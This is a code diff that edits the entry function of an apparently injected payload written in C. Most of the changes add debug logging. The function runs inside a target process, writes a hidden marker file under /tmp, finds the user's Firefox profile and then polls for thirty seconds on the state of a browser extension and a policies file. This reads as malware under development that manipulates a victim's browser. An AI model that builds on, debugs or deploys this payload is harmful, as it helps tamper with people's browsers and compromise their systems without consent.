@@ -1099,38 +1099,60 @@ void my_payload_entry(void *handle, payload_params *params) {
     (void)handle; (void)params;
 
     /* Announce we are alive */
-    const char hello[] = "[payload] my_payload_entry running in target!\n";
-    write(1, hello, sizeof(hello) - 1);
+    printf("[payload] my_payload_entry running in target!\n");
+    fflush(stdout);
+
+    printf("[payload] About to create mark file\n");
+    fflush(stdout);
 
     /* Create mark file */
     char mark_path[64];
     snprintf(mark_path, sizeof(mark_path), "/tmp/.%08lx.%d",
              (unsigned long)(COCKBLOCK_SEED & 0xFFFFFFFFUL), (int)getpid());
+    
+    printf("[payload] Mark path: %s\n", mark_path);
+    fflush(stdout);
+    
     int fd = open(mark_path, O_CREAT | O_WRONLY | O_TRUNC, 0600);
     if (fd >= 0) {
         write(fd, mark_path, strlen(mark_path));
         close(fd);
+        printf("[payload] Created mark file successfully\n");
+        fflush(stdout);
+    } else {
+        printf("[payload] Failed to create mark file\n");
+        fflush(stdout);
     }
+
+    printf("[payload] About to find Firefox profile\n");
+    fflush(stdout);
 
     /* Find Firefox profile */
     char profile_path[PATH_MAX];
+    
+    printf("[payload] Calling find_firefox_profile\n");
+    fflush(stdout);
+    
     if (!find_firefox_profile(profile_path, sizeof(profile_path))) {
-        write(1, "[payload] Failed to find Firefox profile\n", 42);
+        printf("[payload] Failed to find Firefox profile\n");
+        fflush(stdout);
         unlink(mark_path);
         return;
     }
     
-    char msg[256];
-    int n = snprintf(msg, sizeof(msg), "[payload] Found profile: %s\n", profile_path);
-    write(1, msg, n);
+    printf("[payload] Found profile: %s\n", profile_path);
+    fflush(stdout);
 
     /* Main monitoring loop - run for 30 seconds then exit */
+    printf("[payload] Starting monitoring loop\n");
+    fflush(stdout);
+    
     int i = 0;
     while (i < 6) {
         sleep(5);
         
-        n = snprintf(msg, sizeof(msg), "[payload] === Check cycle %d ===\n", ++i);
-        write(1, msg, n);
+        printf("[payload] === Check cycle %d ===\n", ++i);
+        fflush(stdout);
         
         /* Check extension status */
         check_extension_active(profile_path);
@@ -1138,10 +1160,12 @@ void my_payload_entry(void *handle, payload_params *params) {
         /* Check policies file */
         check_policies_exist();
         
-        write(1, "[payload] === End cycle ===\n\n", 29);
+        printf("[payload] === End cycle ===\n\n");
+        fflush(stdout);
     }
 
-    write(1, "[payload] Monitoring complete, exiting\n", 40);
+    printf("[payload] Monitoring complete, exiting\n");
+    fflush(stdout);
     unlink(mark_path);
 }
 
